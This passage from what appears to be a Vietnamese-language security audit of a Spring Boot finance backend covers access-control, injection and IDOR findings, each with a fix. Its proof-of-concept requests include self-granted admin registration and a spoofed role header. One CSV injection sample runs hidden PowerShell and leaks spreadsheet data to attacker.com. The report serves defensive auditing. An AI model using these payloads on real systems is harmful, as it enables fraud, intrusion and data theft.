  .authorizeHttpRequests(auth -> auth
          .requestMatchers("/api/auth/login", "/api/auth/register").permitAll()
          .requestMatchers("/v3/api-docs/**", "/swagger-ui/**", "/swagger-ui.html").hasRole("ADMIN")
          .requestMatchers("/api/admin/**").hasRole("ADMIN")
          .requestMatchers("/api/payouts/**").hasRole("ADMIN")
          .requestMatchers("/api/o2c/**", "/api/transactions/**", "/api/customers/**").authenticated()
          .anyRequest().authenticated()
  );
  ```

---

#### SEC-RBAC-02: Hoàn Toàn Vắng Mặt Các Annotation Kiểm Tra Quyền Hạn Mức Phương Thức (`@PreAuthorize`) Trên Tất Cả Controller
- **Định danh CWE / OWASP:** CWE-862 (Missing Authorization), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - Toàn bộ 9 Controller trong `Backend/src/main/java/com/cactus/practice/rest/`:
    `AdminController.java`, `CustomerController.java`, `TransactionController.java`, `PayoutController.java`, `ProductController.java`, `ConnectedAccountController.java`, `AnalyticsController.java`, `O2CWorkflowController.java`, `AuthController.java`.
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Mặc dù lớp `WebSecurityConfig.java:31` đã khai báo kích hoạt bảo mật mức phương thức `@EnableMethodSecurity(prePostEnabled = true)`, rà soát toàn bộ mã nguồn xác nhận **không có một annotation `@PreAuthorize`, `@Secured` hay `@RolesAllowed` nào** tồn tại trên bất kỳ Controller hay phương thức nào. Kết hợp với lỗ hổng `permitAll()` ở SEC-RBAC-01, hệ thống hoàn toàn không có bất kỳ rào chắn phân quyền vai trò (Role-Based Access Control) nào trên Backend.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Một người dùng thông thường (`ROLE_USER`) đăng nhập hợp lệ và nhận được JWT token. Người dùng này gọi `POST /api/payouts` để chuyển 50,000,000 VND về tài khoản cá nhân. Vì `PayoutController` không có `@PreAuthorize("hasRole('ADMIN')")`, request được thực thi thành công.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Bổ sung `@PreAuthorize` nghiêm ngặt trên tất cả các lớp Controller và phương thức tài chính:
  ```java
  // Trong AdminController.java
  @RestController
  @RequestMapping("/api/admin")
  @PreAuthorize("hasRole('ADMIN')")
  public class AdminController { ... }

  // Trong PayoutController.java
  @RestController
  @RequestMapping("/api/payouts")
  @PreAuthorize("hasRole('ADMIN')")
  public class PayoutController { ... }
  ```

---

#### SEC-RBAC-03: Leo Thang Đặc Quyền Tối Thượng Qua Đăng Ký Tài Khoản Tự Do Gán Vai Trò `admin`
- **Định danh CWE / OWASP:** CWE-269 (Improper Privilege Management), CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), OWASP A01:2021 (Broken Access Control), OWASP API Security API6:2019 (Mass Assignment).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/dto/RegisterRequest.java`: Dòng 17
  - `Backend/src/main/java/com/cactus/practice/rest/AuthController.java`: Dòng 88–106
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Endpoint công khai `POST /api/auth/register` nhận DTO `RegisterRequest` có chứa trường `Set<String> roles`. Trong `AuthController.java`:
  ```java
  // Backend/src/main/java/com/cactus/practice/rest/AuthController.java:102-110
  strRoles.forEach(role -> {
      if ("admin".equalsIgnoreCase(role)) {
          roles.add(RoleType.ROLE_ADMIN);
      } else if ("staff".equalsIgnoreCase(role)) {
          roles.add(RoleType.ROLE_STAFF);
      } else {
          roles.add(RoleType.ROLE_USER);
      }
  });
  user.setRoles(roles);
  userRepository.save(user);
  ```
  Bất kỳ người dùng nặc danh nào trên Internet cũng có thể tự cấp quyền `ROLE_ADMIN` hoặc `ROLE_STAFF` cho chính mình bằng cách đưa `"roles": ["admin"]` vào body JSON đăng ký.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công gửi HTTP request:
     ```http
     POST /api/auth/register HTTP/1.1
     Host: target-host:8080
     Content-Type: application/json

     {
       "username": "attacker_superadmin",
       "email": "attacker@evil.com",
       "password": "Password123!",
       "roles": ["admin"]
     }
     ```
  2. Máy chủ phản hồi: `{"success": true, "message": "User registered successfully!"}`.
  3. Kẻ tấn công đăng nhập tại `/api/auth/login` và nhận JWT chứa quyền `ROLE_ADMIN`.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Loại bỏ hoàn toàn trường `roles` khỏi `RegisterRequest.java`. Mọi tài khoản tự đăng ký bắt buộc phải gán cứng duy nhất `ROLE_USER`. Việc gán quyền Admin/Staff chỉ được phép thực hiện bởi quản trị viên hiện hữu thông qua API quản trị nội bộ:
  ```java
  // Khắc phục trong AuthController.java
  @PostMapping("/register")
  public ResponseEntity<ApiResponse<String>> registerUser(@Valid @RequestBody RegisterRequest signUpRequest) {
      // Validate trùng username / email...
      User user = new User(signUpRequest.getUsername(), encoder.encode(signUpRequest.getPassword()), signUpRequest.getEmail());
      user.setRoles(Set.of(RoleType.ROLE_USER)); // Luôn luôn mặc định là ROLE_USER
      userRepository.save(user);
      return ResponseEntity.ok(ApiResponse.ok("Đăng ký tài khoản thành công!", user.getUsername()));
  }
  ```

---

#### SEC-RBAC-04: Các Điểm Cuối Quản Trị Hệ Thống (`AdminController`) Hoàn Toàn Không Được Xác Thực
- **Định danh CWE / OWASP:** CWE-306 (Missing Authentication for Critical Function), CWE-269 (Improper Privilege Management), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/AdminController.java`: Dòng 23–166
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Lớp `AdminController` chứa các chức năng vận hành tối cao của hệ thống:
  - `GET /api/admin/users`: Liệt kê toàn bộ người dùng, email, danh sách vai trò.
  - `POST /api/admin/users`: Tạo mới tài khoản với vai trò tùy ý.
  - `PUT /api/admin/users/{id}/roles`: Thay đổi vai trò của bất kỳ tài khoản nào thành bất kỳ role nào.
  - `PUT /api/admin/users/{id}/status`: Kích hoạt hoặc khóa bất kỳ tài khoản nào.
  Không có bất kỳ kiểm tra session hay token nào trong lớp này. Kết hợp với `permitAll()` tại SEC-RBAC-01, kẻ tấn công bên ngoài có thể trực tiếp tước quyền của Admin thực sự hoặc khóa tài khoản của ban giám đốc.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công gửi request:
  ```http
  PUT /api/admin/users/1/roles HTTP/1.1
  Content-Type: application/json

  ["ROLE_USER"]
  ```
  Hệ thống lập tức tước quyền `ROLE_ADMIN` của Quản trị viên gốc (ID 1), hoàn tất việc chiếm quyền điều hành (Account Takeover / Denial of Administration).
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Thêm annotation `@PreAuthorize("hasRole('ADMIN')")` ở cấp độ lớp `AdminController` và cấu hình bảo vệ tại `WebSecurityConfig.java`.

---

#### SEC-RBAC-05: Kiểm Tra Vai Trò Dựa Trên HTTP Header Do Client Tự Khai Báo Với Mặc Định Nguy Hại `ROLE_ADMIN`
- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-1188 (Insecure Default Initialization of Resource), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 31, 47, 83, 96, 127, 144, 157, 173, 187
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Thay vì đọc thông tin vai trò từ đối tượng `Authentication` được ký bảo mật trong JWT, toàn bộ các phương thức nhạy cảm trong `O2CWorkflowController` đọc vai trò từ HTTP Header do Client gửi lên:
  ```java
  // Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java:47
  @RequestHeader(value = "X-User-Role", required = false, defaultValue = "ROLE_ADMIN") String userRole
  ```
  Sai lầm này tạo ra 2 thảm họa an ninh:
  1. Kẻ tấn công có thể tùy ý sửa header thành `X-User-Role: ROLE_ADMIN`.
  2. Nguy hiểm hơn, nếu kẻ tấn công **hoàn toàn không gửi header `X-User-Role`**, Spring Boot sẽ tự động gán giá trị mặc định là `"ROLE_ADMIN"`.
  Hơn nữa, tại phương thức `processMakerChecker` (dòng 189), hệ thống thậm chí còn cho phép body JSON ghi đè vai trò:
  `String role = body != null && body.containsKey("role") ? String.valueOf(body.get("role")) : userRole;`.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Một con nợ muốn giải phóng đơn hàng bị khóa do nợ quá hạn (`SO-2026-081`) chỉ cần gửi lệnh:
  ```bash
  curl -X POST http://localhost:8080/api/o2c/orders/SO-2026-081/approve \
       -H "X-User-Role: ROLE_ADMIN"
  ```
  Hệ thống kiểm tra `if (!"ROLE_ADMIN".equalsIgnoreCase(userRole))` thấy trùng khớp và lập tức gỡ bỏ trạng thái `HARD_BLOCK`, cho phép xuất kho lô hàng trị giá 450,000,000 VND mà không có sự đồng ý của Giám đốc Tín dụng.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Xóa bỏ hoàn toàn tất cả các tham số `@RequestHeader("X-User-Role")`. Đọc vai trò người dùng duy nhất từ `SecurityContextHolder.getContext().getAuthentication()`:
  ```java
  // Trong O2CWorkflowController.java
  @PostMapping("/orders/{id}/approve")
  @PreAuthorize("hasRole('ADMIN')")
  public ResponseEntity<ApiResponse<SalesOrderDto>> approveOrder(
          @PathVariable String id,
          Authentication authentication
  ) {
      String approverUsername = authentication.getName();
      SalesOrderDto updated = o2cService.approveOrderCredit(id, approverUsername);
      return ResponseEntity.ok(ApiResponse.ok("Order approved and released", updated));
  }
  ```

---

#### SEC-RBAC-06: Vi Phạm Nguyên Tắc Phân Nhiệm (Segregation of Duties - SoD) & Kiểm Soát Kép (Maker-Checker) Trong Các Luồng Tài Chính
- **Định danh CWE / OWASP:** CWE-653 (Improper Adherence to Reverse Engineerable or Discretionary Access Control), Vi phạm nguyên tắc Four-Eyes Principle / SoD, OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.1 / AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 42–58, 182–201
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 291–301, 376–385
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Quy trình kiểm soát kép (Maker-Checker) bắt buộc người tạo đề xuất tài chính (Maker) và người phê duyệt (Checker) phải là hai cá nhân độc lập có thẩm quyền khác nhau:
  1. Trong `processMakerChecker`: Danh tính `checker` được lấy từ trường unverified trong body JSON: `String checker = String.valueOf(body != null ? body.getOrDefault("checker", "Admin / Head of Credit") : "Admin / Head of Credit");`.
  2. Trong `O2CWorkflowService.java`: Không có bất kỳ logic nào so sánh giữa `maker` và `checker`. Một nhân viên có thể tự tạo đề xuất xóa nợ xấu 500,000,000 VND và sau đó tự duyệt đề xuất của chính mình.
  3. Trong `approveOrderCredit`: Tên người phê duyệt lấy từ `@RequestParam(defaultValue = "Admin / Credit Manager") String approver`, cho phép nhân viên bán hàng tự ghi tên mình làm người duyệt mở khóa hạn mức tín dụng.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Một nhân viên câu kết với khách hàng tạo yêu cầu xóa sổ công nợ khó đòi `MC-2026-029` (500 triệu đồng).
  2. Nhân viên này gửi request:
     ```http
     POST /api/o2c/maker-checker/MC-2026-029/process HTTP/1.1
     Content-Type: application/json
     X-User-Role: ROLE_ADMIN

     {
       "approved": true,
       "checker": "Tự Duyệt Hợp Lệ"
     }
     ```
  3. Yêu cầu được chuyển thành `APPROVED`, nợ xấu bị xóa vĩnh viễn khỏi sổ cái mà không qua bất kỳ sự kiểm tra độc lập nào từ ban kiểm soát.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Ràng buộc định danh Maker và Checker với username đã xác thực từ JWT. Triển khai kiểm tra SoD bắt buộc:
  ```java
  // Trong O2CWorkflowService.java
  public MakerCheckerDto processMakerChecker(String reqId, boolean approved, String checkerUsername) {
      MakerCheckerDto mc = findMakerCheckerById(reqId);
      if (mc.getMaker().equalsIgnoreCase(checkerUsername)) {
          throw new BusinessException("VI PHẠM BẢO MẬT SOD: Người tạo yêu cầu (Maker) không được phép tự phê duyệt (Checker) giao dịch tài chính này!");
      }
      mc.setStatus(approved ? "APPROVED" : "REJECTED");
      mc.setChecker(checkerUsername + (approved ? " (Đã duyệt)" : " (Từ chối)"));
      mc.setProcessedAt(LocalDateTime.now());
      return mc;
  }
  ```

---

### MỤC TIÊU 3: LỖ HỔNG INJECTION & XÁC THỰC DỮ LIỆU ĐẦU VÀO (INJECTION & VALIDATION)

#### SEC-INJ-01: CSV Formula Injection (Nguy Cơ Thực Thi Mã Lệnh Lén & Trích Xuất Dữ Liệu) Trong Xuất Báo Cáo Giao Dịch
- **Định danh CWE / OWASP:** CWE-1236 (Improper Neutralization of Formula Elements in CSV File), OWASP A03:2021 (Injection).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 8.2 / AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/TransactionController.java`: Dòng 74–80
  - `Backend/src/main/java/com/cactus/practice/service/impl/TransactionServiceImpl.java`: Dòng 147–164, 187–190
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Hệ thống cung cấp chức năng xuất danh sách giao dịch tài chính ra file CSV qua `GET /api/transactions/export/csv`. Trong phương thức `escapeCsv()` của `TransactionServiceImpl.java`:
  ```java
  // Backend/src/main/java/com/cactus/practice/service/impl/TransactionServiceImpl.java:187-190
  private String escapeCsv(String val) {
      if (val == null) return "\"\"";
      return "\"" + val.replace("\"", "\"\"") + "\"";
  }
  ```
  Phương thức này chỉ nhân đôi dấu ngoặc kép mà hoàn toàn không vô hiệu hóa các ký tự bắt đầu công thức tính toán (`=`, `+`, `-`, `@`, tab, newline). Các trường dữ liệu do người dùng kiểm soát như `customerName`, `description`, `customerEmail` được nối trực tiếp vào luồng CSV. Khi kế toán hoặc quản trị viên mở tệp CSV này bằng Microsoft Excel hoặc LibreOffice, phần mềm bảng tính sẽ tự động thực thi công thức chứa mã độc.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công tạo một giao dịch thanh toán qua `POST /api/transactions`:
     ```json
     {
       "amount": 10.0,
       "customerName": "=cmd|' /C powershell.exe -w hidden -enc <malicious_payload>'!A0",
       "description": "=HYPERLINK(\"http://attacker.com/leak?d=\"&A2, \"Click to Reconcile\")"
     }
     ```
  2. Kế toán tải file `transactions.csv` từ trang quản trị và mở bằng Excel.
  3. Excel thực thi lệnh PowerShell để chiếm quyền điều khiển máy tính kế toán hoặc tự động gửi toàn bộ dữ liệu ô bên cạnh (số dư, số tài khoản ngân hàng) tới máy chủ của kẻ tấn công qua hàm `HYPERLINK`.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Khử trùng các ký tự khởi tạo công thức bằng cách chèn dấu nháy đơn `'` ở đầu chuỗi:
  ```java
  private String escapeCsv(String val) {
      if (val == null) return "\"\"";
      String sanitized = val;
      if (sanitized.startsWith("=") || sanitized.startsWith("+") ||
          sanitized.startsWith("-") || sanitized.startsWith("@") ||
          sanitized.startsWith("\t") || sanitized.startsWith("\r")) {
          sanitized = "'" + sanitized;
      }
      return "\"" + sanitized.replace("\"", "\"\"") + "\"";
  }
  ```

---

#### SEC-INJ-02: Mass Assignment Và Thiếu Xác Thực Dữ Liệu Khi Tạo Cam Kết Trả Nợ (PTP Dispute)
- **Định danh CWE / OWASP:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-20 (Improper Input Validation), OWASP A04:2021 (Insecure Design), OWASP API Security API6:2019 (Mass Assignment).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.5 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 117–120
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 337–344
  - `Backend/src/main/java/com/cactus/practice/dto/O2CDtos.java`: Dòng 81–93 (`PtpDisputeDto`)
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Endpoint `POST /api/o2c/ptp` ánh xạ trực tiếp toàn bộ thực thể `PtpDisputeDto` từ request body của người dùng mà không có annotation `@Valid`. Lớp DTO này chứa các trường trạng thái vận hành nội bộ quan trọng: `id`, `brokenPtpCount` (số lần bội tín thất hứa trả nợ), `slaRemainingHours` (thời gian xử lý khiếu nại còn lại), `status`. Phương thức `createPtp` giữ nguyên `dto.getId()` nếu client gửi lên.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Một doanh nghiệp nợ đọng có chỉ số bội tín cao (`brokenPtpCount = 3`) và sắp bị chuyển sang giai đoạn cưỡng chế pháp lý. Kẻ tấn công gửi request:
  ```json
  POST /api/o2c/ptp
  {
    "id": "PTP-2026-015",
    "brokenPtpCount": 0,
    "slaRemainingHours": 9999,
    "status": "HONORED"
  }
  ```
  Hệ thống ghi đè dữ liệu, xóa sạch lịch sử bội tín của doanh nghiệp và kéo dài thời gian xử lý khiếu nại, vô hiệu hóa quy trình khởi kiện thu hồi nợ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Tạo DTO chuyên biệt `PtpCreateRequest` chỉ chứa các trường người dùng được phép cung cấp. Các trường logic tính toán (`brokenPtpCount`, `slaRemainingHours`, `status`, `id`) bắt buộc phải do Backend tính toán:
  ```java
  public class PtpCreateRequest {
      @NotBlank(message = "Invoice ID không được để trống")
      private String invoiceId;

      @NotNull(message = "Ngày cam kết trả nợ không được để trống")
      @FutureOrPresent(message = "Ngày cam kết phải ở hiện tại hoặc tương lai")
      private LocalDate committedDate;

      @NotBlank(message = "Lý do không được để trống")
      @Size(max = 500, message = "Lý do không vượt quá 500 ký tự")
      private String reason;
  }
  ```

---

#### SEC-INJ-03: Thiếu Giới Hạn Biên Dữ Liệu Số Tiền Tài Chính Cho Phép Nhập Số Tiền Tùy Ý
- **Định danh CWE / OWASP:** CWE-20 (Improper Input Validation), CWE-1284 (Improper Validation of Specified Quantity in Input), OWASP A04:2021 (Insecure Design).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 6.5 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/dto/PaymentChargeRequest.java`: Dòng 10–11
  - `Backend/src/main/java/com/cactus/practice/dto/PayoutRequest.java`: Dòng 9–10
  - `Backend/src/main/java/com/cactus/practice/dto/ProductRequest.java`: Dòng 12–13
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 70–73
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  - Trong `PaymentChargeRequest.java` và `PayoutRequest.java`, trường `amount` chỉ có `@DecimalMin(value = "0.50")` hoặc `@DecimalMin(value = "1.00")` mà không hề có giới hạn trần `@DecimalMax`.
  - Trong `ProductRequest.java`, trường `price` là kiểu `String` thuần túy chỉ có `@NotBlank`, cho phép nhập số âm hoặc ký tự đặc biệt.
  - Trong `O2CWorkflowController.java:70`, `payInvoice` nhận `Map<String, String> body` không thông qua DTO chuẩn hóa.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công gọi `POST /api/payouts` với số tiền `amount: 999999999999999.00`. Hệ thống ghi nhận lệnh rút tiền khổng lồ, làm âm số dư của doanh nghiệp trên sổ cái điện tử.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Áp dụng đầy đủ `@DecimalMax`, `@DecimalMin` và `@Digits` cho mọi trường tiền tệ:
  ```java
  @NotNull(message = "Số tiền là bắt buộc")
  @DecimalMin(value = "1.00", message = "Số tiền tối thiểu là 1.00")
  @DecimalMax(value = "1000000000.00", message = "Số tiền tối đa cho một giao dịch là 1 tỷ")
  @Digits(integer = 12, fraction = 2, message = "Định dạng số tiền không hợp lệ")
  private BigDecimal amount;
  ```

---

#### SEC-INJ-04: Thiếu Giới Hạn Độ Dài Ký Tự Trong DTO Gây Rủi Ro Cạn Kiệt Bộ Nhớ / DoS
- **Định danh CWE / OWASP:** CWE-400 (Uncontrolled Resource Consumption), CWE-20 (Improper Input Validation), OWASP A04:2021 (Insecure Design).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/dto/CustomerRequest.java`: Dòng 8–17
  - `Backend/src/main/java/com/cactus/practice/dto/ConnectedAccountRequest.java`: Dòng 9–18
  - `Backend/src/main/java/com/cactus/practice/dto/ProductRequest.java`: Dòng 7–16
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Các trường chuỗi như `name`, `address`, `description`, `location`, `payoutBank` hoàn toàn thiếu annotation `@Size(max = ...)`. Kẻ tấn công có thể gửi các chuỗi văn bản dài hàng chục megabyte trong body request, làm tràn bộ đệm RAM của JVM hoặc làm sập cơ sở dữ liệu khi Hibernate cố gắng insert chuỗi vượt quá dung lượng cột `VARCHAR`.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công gửi một request `POST /api/customers` với trường `address` chứa chuỗi 10,000,000 ký tự lặp lại. Quá trình xử lý chuỗi làm tăng vọt dung lượng Heap memory và kích hoạt Garbage Collection liên tục, gây chậm và treo hệ thống cho người dùng khác.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Bổ sung ràng buộc `@Size(min = ..., max = ...)` trên mọi trường chuỗi trong DTO tương thích với schema cơ sở dữ liệu.

---

#### SEC-INJ-05: Tiêu Tốn Tài Nguyên CSDL Do Không Escape Ký Tự Đại Diện LIKE Trong Hibernate Criteria Search
- **Định danh CWE / OWASP:** CWE-400 (Uncontrolled Resource Consumption), CWE-20 (Improper Input Validation), OWASP A03:2021 (Injection).
- **Mức độ rủi ro:** **LOW** (CVSS v3.1: 4.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/HibernateDao/HibernateDao.java`: Dòng 103
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong lớp tiện ích tìm kiếm linh hoạt `HibernateDao.java`:
  ```java
  predicates.add(cb.like(cb.lower(path.as(String.class)), "%" + rawValue.toString().toLowerCase() + "%"));
  ```
  Tham số `rawValue` do người dùng cung cấp không được lọc các ký tự đại diện SQL LIKE (`%`, `_`, `\`).
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công gọi API tìm kiếm với chuỗi `search=name:%%%%%%%%%%%%%%%%%%%%%%%%%%%%`. CSDL phải thực hiện quét toàn bộ bảng (Full Table Scan) và so khớp biểu thức phức tạp, làm vô hiệu hóa chỉ mục B-Tree và tiêu tốn CPU của máy chủ MySQL.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Escape các ký tự `%`, `_` và `\` trước khi đưa vào biểu thức CriteriaBuilder:
  ```java
  String escapedVal = rawValue.toString().replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_");
  predicates.add(cb.like(cb.lower(path.as(String.class)), "%" + escapedVal.toLowerCase() + "%", '\\'));
  ```

---

### MỤC TIÊU 4: KIỂM SOÁT QUYỀN MỨC ĐỐI TƯỢNG (BOLA / IDOR)

#### SEC-BOLA-01: Lỗ Hổng BOLA / IDOR Toàn Diện Trong Quản Lý Thông Tin Khách Hàng Doanh Nghiệp
- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-862 (Missing Authorization), CWE-284 (Improper Access Control), OWASP A01:2021 (Broken Access Control), OWASP API Security API1:2019 (Broken Object Level Authorization).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/CustomerController.java`: Dòng 36–62
  - `Backend/src/main/java/com/cactus/practice/service/impl/CustomerServiceImpl.java`: Dòng 41–44, 69–79, 82–87
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Các endpoint thao tác với khách hàng (`GET /api/customers/{id}`, `PUT /api/customers/{id}`, `DELETE /api/customers/{id}`) sử dụng trực tiếp tham số đường dẫn `{id}` mà không hề kiểm tra danh tính tài khoản đang gửi request có quyền sở hữu hoặc đại diện cho doanh nghiệp đó hay không. Trong `CustomerServiceImpl.java`:
  ```java
  @Override
  public Customer getCustomerById(String id) {
      return customerRepository.findById(id)
              .orElseThrow(() -> new ResourceNotFoundException("Customer not found with id: " + id));
  }
  @Override
  public void deleteCustomer(String id) {
      Customer customer = getCustomerById(id);
      customerRepository.delete(customer);
  }
  ```
  Bất kỳ ai (kể cả người dùng nặc danh nhờ lỗ hổng `permitAll`) cũng có thể tra cứu toàn bộ hồ sơ thuế, hạn mức tín dụng, và thậm chí xóa sổ khách hàng đối thủ bằng cách thay đổi ID trên URL.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công đại diện cho công ty A (`cus_DEBT_001`) gửi request `GET /api/customers/cus_DEBT_002`.
  2. Máy chủ trả về đầy đủ thông tin bí mật kinh doanh của Tập đoàn Xây dựng An Bình: Số điện thoại, người liên hệ, số dư nợ `$12,800.00 USD`, phương thức thanh toán.
  3. Kẻ tấn công gửi `DELETE /api/customers/cus_DEBT_002`. Dữ liệu khách hàng bị xóa vĩnh viễn khỏi CSDL, phá vỡ toàn bộ dữ liệu đối soát nợ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  1. Yêu cầu xác thực bắt buộc.
  2. Bổ sung kiểm tra quyền sở hữu đối tượng dựa trên Tenant ID hoặc Customer ID của tài khoản đang đăng nhập:
  ```java
  @PreAuthorize("hasRole('ADMIN') or hasRole('STAFF') or @securityService.isCustomerOwner(authentication, #id)")
  @GetMapping("/{id}")
  public ResponseEntity<ApiResponse<Customer>> getCustomerById(@PathVariable String id) {
      Customer customer = customerService.getCustomerById(id);
      return ResponseEntity.ok(ApiResponse.ok("Customer retrieved successfully", customer));
  }
  ```

---

#### SEC-BOLA-02: BOLA / IDOR Trong Quản Lý Hóa Đơn Điện Tử, Lộ Dữ Liệu Thuế Và Ghi Nhận Thanh Toán Trái Phép
- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-862 (Missing Authorization), OWASP A01:2021 (Broken Access Control), OWASP API Security API1:2019 (Broken Object Level Authorization).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.1 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 60–64, 66–78
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 303–316
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  - Phương thức `getInvoices` (`GET /api/o2c/invoices`) trả về toàn bộ danh sách hóa đơn điện tử của mọi doanh nghiệp trong hệ thống, làm lộ thông tin nhạy cảm: Mã số thuế, tài khoản ảo (VA), chuỗi thanh toán VietQR động, và số tiền nợ.
  - Phương thức `payInvoice` (`POST /api/o2c/invoices/{id}/pay`) nhận `{id}` và cập nhật trực tiếp `inv.setPaymentStatus("PAID")`, `inv.setRemainingAmount("0 ₫")` mà không xác minh xem người gọi có phải là bên thanh toán hợp pháp hoặc có xác nhận tiền về từ ngân hàng hay không.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Doanh nghiệp nợ gọi `GET /api/o2c/invoices` để lấy mã hóa đơn `INV-2026-0088` (trị giá 1,250,000,000 VND). Sau đó gửi `POST /api/o2c/invoices/INV-2026-0088/pay`. Hệ thống lập tức đánh dấu hóa đơn đã thanh toán đầy đủ, khiến công nợ bị gạch khỏi hệ thống theo dõi.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Lọc hóa đơn theo tổ chức của người dùng đối với `ROLE_USER`; chỉ cho phép cập nhật trạng thái `PAID` từ Webhook ngân hàng có chữ ký HMAC hợp lệ hoặc bởi nhân viên kế toán có thẩm quyền (`ROLE_STAFF`, `ROLE_ADMIN`).

---

#### SEC-BOLA-03: BOLA / IDOR Trong Giao Dịch Thanh Toán Và Tự Động Kích Hoạt Hoàn Tiền (Refund)
